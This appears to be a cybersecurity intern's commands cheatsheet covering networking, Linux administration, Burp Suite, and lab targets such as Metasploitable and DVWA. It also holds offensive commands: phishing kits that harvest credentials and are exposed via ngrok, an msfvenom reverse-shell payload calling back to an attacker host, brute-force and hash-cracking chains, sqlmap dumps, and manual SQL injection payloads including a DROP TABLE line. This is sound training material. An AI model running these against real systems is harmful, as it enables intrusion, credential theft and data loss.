# Commands Cheatsheet

Quick-reference for commands used during the internship. Organized by domain.

> **Guideline:** Only add commands that were actually used and understood. This is a personal reference, not a bulk dump.

---

## Network Analysis

```bash
# ip — Interface and routing inspection (Day 01)
ip addr show                # View all interfaces with assigned IPs
ip link show                # View interface status (UP/DOWN)
ip route show               # View routing table and default gateway

# ss — Socket statistics (Day 01)
ss -tuln                    # List TCP/UDP listening ports (numeric)

# ping — Reachability testing (Day 01)
ping -c 4 192.0.2.1         # Send 4 ICMP echo requests

# curl — HTTP inspection (Day 01)
curl -I https://example.com # Fetch HTTP response headers only
```

```bash
# Nmap — Network scanning and discovery (Day 03)
nmap 192.0.2.1               # Basic TCP scan (top 1000 ports)
nmap -p 22,80,443 192.0.2.1  # Scan specific ports
nmap -p- 192.0.2.1           # Scan all 65,535 ports
sudo nmap -sS 192.0.2.1      # SYN scan (half-open, stealthier, requires root)
nmap -sT 192.0.2.1           # TCP Connect scan (full handshake)
sudo nmap -sU 192.0.2.1      # UDP scan (requires root)
nmap -sV 192.0.2.1           # Service version detection
nmap -sC 192.0.2.1           # Run default NSE scripts
sudo nmap -A 192.0.2.1       # Aggressive scan (OS, version, scripts, traceroute)
```

```bash
# Wireshark — Display filters (Day 08)
# (Typed into the filter bar after capture has started)
ip.addr == 192.0.2.10                     # All traffic to/from an IP
ip.src == 192.0.2.10                      # Only traffic FROM this IP
ip.dst == 192.0.2.10                      # Only traffic TO this IP
tcp.port == 80                            # TCP traffic on port 80
tcp.dstport == 443                        # TCP destined for port 443
udp.port == 53                            # DNS traffic
http.request.method == "POST"             # HTTP POST requests (login forms)
tcp.flags.syn == 1 && tcp.flags.ack == 1  # SYN-ACK → reveals OPEN ports
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN only → connection attempts
dns.qry.name contains "example"           # DNS queries for a domain
http.server                               # Packets with Server header (version info)
ftp.request.command == "USER" || ftp.request.command == "PASS"  # FTP credentials
tcp.stream eq 5                           # Follow a specific TCP conversation
```

```bash
# Wireshark — Capture filters / BPF syntax (Day 08)
# (Set BEFORE capture starts — non-matching packets are permanently discarded)
host 192.0.2.10                           # Traffic to/from specific IP
port 80                                   # Traffic on port 80
net 192.0.2.0/24                          # Traffic on a subnet
tcp                                       # TCP only
not arp                                   # Exclude ARP
host 192.0.2.10 and port 443              # Combined filter

# hping3 — DoS testing and packet generation (Day 10)
sudo hping3 --flood --rand-source -S -p 8080 127.0.0.1  # SYN flood simulation
sudo hping3 --flood --rand-source --udp -p 8080 127.0.0.1  # UDP flood simulation

# iptables — Rate limiting and SYN flood mitigation (Day 10)
sudo iptables -A INPUT -p tcp --syn --dport 8080 -m limit --limit 10/s --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn --dport 8080 -j DROP

# sysctl — Kernel tuning for networking (Day 10)
sudo sysctl -w net.ipv4.tcp_syncookies=1
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=256
```

```bash
# tshark — CLI packet analysis (Day 08)
tshark -i eth0 -c 100                     # Capture 100 packets
tshark -i eth0 -Y "http"                  # Capture with display filter
tshark -r capture.pcapng -Y "ip.addr == 192.0.2.10"  # Read file + filter
tshark -r capture.pcapng -Y "tcp.flags.syn==1 && tcp.flags.ack==1" \
  -T fields -e ip.src -e tcp.srcport      # Extract open ports (like nmap)
tshark -r capture.pcapng -q -z io,phs     # Protocol hierarchy statistics
```

---

## Linux Administration

```bash
# Filesystem navigation (Day 01)
pwd                         # Print working directory
ls -la                      # List all files with permissions
cd /path                    # Change directory
mkdir -p dir/subdir         # Create nested directories

# File operations (Day 01)
touch file.txt              # Create empty file
cp src dest                 # Copy file
mv old new                  # Move or rename file
rm -rf dir/                 # Remove directory recursively

# File permissions and ownership (Day 01)
chmod 755 script.sh         # Set rwxr-xr-x permissions
chmod u+x script.sh         # Add execute for owner
chown user:group file.txt   # Change ownership

# Process management (Day 01)
ps aux                      # List all running processes
top                         # Real-time process monitor
kill -9 <PID>               # Force terminate process
systemctl status <service>  # Check systemd service status

# System information (Day 01)
uname -a                    # Kernel and OS details
df -h                       # Disk usage (human-readable)
free -h                     # Memory usage (human-readable)

# Filesystem inspection (Day 02)
tree -L 1 --dirsfirst /     # Top-level directory overview
tree -L 2 --dirsfirst /etc  # Two-level view of a specific directory
file /path/to/file          # Identify file type by content
stat /path/to/file          # Detailed metadata (permissions, inode, timestamps)
find /etc -name "*.conf"    # Search for files by name pattern
cat /etc/passwd             # Display file contents

# User and group management (Day 04)
sudo useradd -m testuser    # Add user and create home directory
sudo useradd -M svc_account # Add user without home directory
sudo userdel -r testuser    # Delete user, home directory, and mail spool
sudo groupadd developers    # Create a new group
sudo groupdel developers    # Delete a group
sudo usermod -aG sudo user  # Append user to a secondary group
sudo usermod -s /bin/bash user # Set default shell for a user
sudo su testuser            # Switch to another user context

# File inspection and bash efficiency (Day 04)
head -n 5 /etc/passwd       # View the first 5 lines of a file
tail -n 5 /etc/passwd       # View the last 5 lines of a file
sudo !!                     # Execute the previous command with sudo
```

---

## Web Application Security

```bash
# Burp Suite — Setup and proxy configuration (Day 07)
# 1. Launch Burp Suite (listens on 127.0.0.1:8080 by default)
burpsuite &

# 2. Configure Firefox: Settings → Network → Manual Proxy → 127.0.0.1:8080
# 3. Install Burp CA cert: browse to http://burp → download cacert.der → import into Firefox

# Burp Suite — Core workflow (Day 07)
# Proxy → Intercept is on   → catch and modify live requests before forwarding
# Proxy → HTTP history      → review all past requests/responses (even with intercept off)
# Right-click request → Send to Repeater  → manually modify and resend
# Right-click request → Send to Intruder  → set payload positions with § markers

# Burp Intruder — Attack types (Day 07)
# Sniper:        Single payload list, one position at a time
# Battering Ram:  Single payload list, same value in all positions simultaneously
# Pitchfork:     One list per position, iterated in parallel (pair 1, pair 2, ...)
# Cluster Bomb:  One list per position, every combination (Cartesian product)

# Burp Intruder — Results analysis (Day 07)
# Sort by "Length" column → the response size that differs from the majority = likely success
# Sort by "Status" column → look for 302 redirects among 200 responses
```

```bash
# Metasploitable 2 — Lab target setup (Day 07)
# Import .vmdk into VirtualBox → set network to Host-Only → boot
# Default credentials: msfadmin / msfadmin
# Access web apps: http://<metasploitable-ip>/
# DVWA login: http://<metasploitable-ip>/dvwa/login.php (admin / password)
```

---

## Defensive / Blue Team

```bash
# Firewall rules (iptables / ufw)
# [Add commands as used]
```

```bash
# Log analysis
# [Add commands as used]
```

---

## Social Engineering / Phishing

```bash
# Zphisher — Automated phishing page generator (Day 09)
git clone https://github.com/htr-tech/zphisher.git  # Clone the repository
chmod +x zphisher.sh                                 # Make executable
bash zphisher.sh                                     # Launch Zphisher
# Select template (e.g., 03 for Google) → set port → phishing page served
# Credentials captured in auth/usernames.dat
```

```bash
# SET (Social Engineering Toolkit) — Credential Harvester (Day 09)
sudo setoolkit                                        # Launch SET (requires root)
# Navigate: 1 → Social-Engineering Attacks
#           2 → Website Attack Vectors
#           3 → Credential Harvester Attack Method
#           2 → Site Cloner
# Enter attacker IP → Enter URL to clone → Harvester starts on port 80
# Credentials saved to /root/.set/reports/
```

```bash
# Ngrok — Tunnel local server to the internet (Day 09)
ngrok config add-authtoken <YOUR_AUTH_TOKEN>           # One-time authentication
ngrok http 80                                         # Expose port 80 publicly
ngrok http 8080                                       # Expose port 8080 publicly
# Provides a public https://xxxx.ngrok-free.app URL forwarding to localhost
```
# Metasploit — Core commands (Day 11)
msfconsole                                           # Launch the Metasploit console
workspace -a <name>                                  # Create a new workspace for organized testing
workspace <name>                                     # Switch to an existing workspace
db_nmap -sV <target>                                 # Import Nmap scan results into Metasploit's database
search <term>                                        # Find modules by name, type, or platform
use <module>                                         # Load an exploit, auxiliary, or post module
show options                                         # Display required and optional settings for the loaded module
show payloads                                        # List payloads compatible with the loaded exploit
set RHOSTS <target>                                  # Set the remote target address
set LHOST <attacker_ip>                              # Set the callback address for reverse payloads
set LPORT <port>                                     # Set the callback port for payloads
exploit                                              # Run the loaded exploit module
sessions -l                                          # List active Meterpreter sessions
sessions -i <id>                                     # Interact with a specific session
background                                           # Background the current session without closing it
run                                                  # Execute a loaded post module against a session

# msfvenom — Payload generation (Day 11)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf
---

## Authentication Brute Force

```bash
# Hydra — Online password brute force against SSH/FTP/HTTP (Day 12)
hydra -l msfadmin -P ~/wordlists/common-passwords.txt ssh://192.0.2.10
hydra -L ~/wordlists/usernames.txt -P ~/wordlists/common-passwords.txt ftp://192.0.2.10
hydra -L ~/wordlists/usernames.txt -P ~/wordlists/common-passwords.txt 192.0.2.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"

# Medusa — Parallel remote login attacks (Day 12)
medusa -h 192.0.2.10 -U ~/wordlists/usernames.txt -P ~/wordlists/common-passwords.txt -M ssh

# Ncrack — High-speed network authentication cracking (Day 12)
ncrack -p ssh,ftp 192.0.2.10

# Patator — Custom brute-force workflows and failure matching (Day 12)
patator ssh_login host=192.0.2.10 user=FILE0 password=FILE1 0=~/wordlists/usernames.txt 1=~/wordlists/common-passwords.txt
```

## Database Administration / SQL

```bash
# MySQL — Connection and basic operations (Day 13)
mysql -h 192.0.2.10 -u root -p                    # Connect to remote MySQL server
mysql -u root                                      # Connect locally (on Metasploitable VM)
```

```sql
-- MySQL — Database and table management (Day 13)
SHOW DATABASES;                                   -- List all databases
USE database_name;                                -- Select a database
SHOW TABLES;                                      -- List tables in current database
DESCRIBE table_name;                              -- Show table structure
SHOW CREATE TABLE table_name\G                    -- Show table creation statement

-- SELECT queries — retrieving data (Day 13)
SELECT * FROM users;                              -- Select all rows and columns
SELECT username, email FROM users;                -- Select specific columns
SELECT * FROM users WHERE user_id = 1;           -- Filter with WHERE clause
SELECT COUNT(*) FROM users;                       -- Count total rows
SELECT username FROM users WHERE username LIKE 'admin%';
SELECT * FROM users ORDER BY username ASC;       -- Order results
SELECT * FROM users LIMIT 5;                      -- Limit result set

-- INSERT queries — adding data (Day 13)
INSERT INTO users (username, password, email) VALUES ('testuser', 'pass', 'test@example.com');
INSERT INTO users (username, password) VALUES ('user2', 'pass2'), ('user3', 'pass3');

-- UPDATE queries — modifying data (Day 13)
UPDATE users SET password = 'newpass' WHERE username = 'testuser';
UPDATE users SET password = 'reset', email = 'new@example.com' WHERE user_id = 5;

-- DELETE queries — removing data (Day 13)
DELETE FROM users WHERE username = 'testuser';
DELETE FROM users WHERE user_id = 10;

-- JOINs — combining multiple tables (Day 13)
SELECT users.username, guestbook.comment FROM users INNER JOIN guestbook ON users.user_id = guestbook.user_id;
SELECT users.username, messages.text FROM users LEFT JOIN messages ON users.user_id = messages.user_id;

-- GROUP BY and aggregation (Day 13)
SELECT username, COUNT(*) as message_count FROM users LEFT JOIN messages ON users.user_id = messages.user_id GROUP BY username;
SELECT COUNT(*), MAX(user_id), MIN(user_id) FROM users;

-- Transactions — ACID operations (Day 13)
START TRANSACTION;
INSERT INTO users (username, password) VALUES ('trans_user', 'pass');
COMMIT;                                           -- Or: ROLLBACK;

-- User and permission management (Day 13)
CREATE USER 'webapp'@'192.0.2.1' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON database_name.* TO 'webapp'@'192.0.2.1';
SHOW GRANTS FOR 'webapp'@'192.0.2.1';
REVOKE INSERT ON database_name.* FROM 'webapp'@'192.0.2.1';
DROP USER 'webapp'@'192.0.2.1';

-- Indexes — improving query performance (Day 13)
CREATE INDEX idx_username ON users(username);
CREATE INDEX idx_user_email ON users(username, email);
SHOW INDEX FROM users;
DROP INDEX idx_username ON users;
EXPLAIN SELECT * FROM users WHERE username = 'admin';
```

## SQL Injection / Application Security

```bash
# sqlmap — Automated SQL injection detection and exploitation (Day 14)
sqlmap -u "http://192.0.2.10/dvwa/login.php" --forms --batch --risk=3 --level=5
sqlmap -u "<url>" --data="username=admin&password=pass&Login=Login" --dbs --batch
sqlmap -u "<url>" --data="<POST_data>" -D dvwa --tables --batch
sqlmap -u "<url>" --data="<POST_data>" -D dvwa -T users -C username,password --dump --batch
sqlmap -u "<url>" --data="<POST_data>" --technique=E --batch  # Error-based only
sqlmap -u "<url>" --data="<POST_data>" --technique=U --batch  # UNION-based only
sqlmap -u "<url>" --data="<POST_data>" --technique=T --batch  # Time-based only
sqlmap -u "<url>" --data="<POST_data>" --tamper=space2comment,between --batch  # WAF bypass
```

```sql
-- Manual SQL Injection payloads (Day 14)

-- Authentication bypass
admin' OR '1'='1
' OR 1=1-- 
' OR 1=1/*

-- Time-based blind SQL injection (5 second delay confirms vulnerability)
admin' AND SLEEP(5)-- 

-- UNION-based injection (extract database version)
' UNION SELECT user(),database(),version(),@@version_comment-- 

-- Error-based SQL injection (reveals database structure in errors)
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- 

-- Determine column count with ORDER BY
1' ORDER BY 1-- 
1' ORDER BY 5-- 
-- When ORDER BY 5 fails but ORDER BY 4 succeeds, column count = 4

-- UNION SELECT with matched column count
1' UNION SELECT username,password,email,user_id FROM users-- 

-- Extract from information_schema (MySQL metadata)
1' UNION SELECT TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,4 FROM information_schema.COLUMNS-- 

-- Cookie-based SQL injection
-- Cookie: PHPSESSID=1' UNION SELECT user(),database(),version(),4-- 
-- The application passes unvalidated cookies to SQL queries

-- Stacked queries (multiple statements, if supported)
admin'; DROP TABLE users; INSERT INTO test VALUES (1); -- 
```

```bash
# Integration workflow: sqlmap + hash-id + hydra (Day 14)

# Step 1: Extract hashes via sqlmap
sqlmap -u "http://192.0.2.10/dvwa/login.php" \
  --data="username=admin&password=pass&Login=Login" \
  -D dvwa -T users -C password --dump --batch > hashes.txt

# Step 2: Identify hash type
hash-id < hashes.txt
# Alternative: hash-identifier (interactive)

# Step 3: Crack hashes with hashcat or dictionary attack
hashcat -m 0 hashes.txt ~/wordlists/rockyou.txt

# Step 4: Use cracked credentials with hydra
hydra -l admin -P ./cracked_passwords.txt 192.0.2.10 ssh -t 4 -V

# Result: SQL Injection → Hash Extraction → Hash Crack → Elevated Access
```

## Offensive / Red Team

```bash
# Enumeration
# [Add commands as used]
```

```bash
# Exploitation
# [Add commands as used]
```

---

## Cryptography and Password Recovery

```bash
# Hash generation and identification (Day 05)
echo -n "hello" | md5sum    # Generate MD5 hash of a string (-n prevents trailing newline)
hashid <hash>               # Identify likely algorithms for an unknown hash
hash-identifier             # Interactive tool for identifying unknown hashes

# Hashcat — Password recovery (Day 05)
hashcat -m 0 -a 3 <hash> ?a?a?a?a?a  # Mask attack against an MD5 hash (5 chars)
hashcat -m 0 -a 0 <hashes.txt> <wordlist.txt> # Dictionary attack using a wordlist
hashcat -m 0 -a 1 <hashes.txt> dict1.txt dict2.txt # Combinator attack
hashcat -m 0 --show <hash>           # Show already cracked hash from potfile
```

```python
# Python hashlib — Custom hash automation (Day 06)
import hashlib
hashlib.sha512("input".encode('utf-8')).hexdigest()  # Generate SHA-512 hash
hashlib.sha256("input".encode('utf-8')).hexdigest()  # Generate SHA-256 hash
hashlib.md5("input".encode('utf-8')).hexdigest()     # Generate MD5 hash
```

---

*Add the Day number next to each command for cross-referencing with daily logs.*
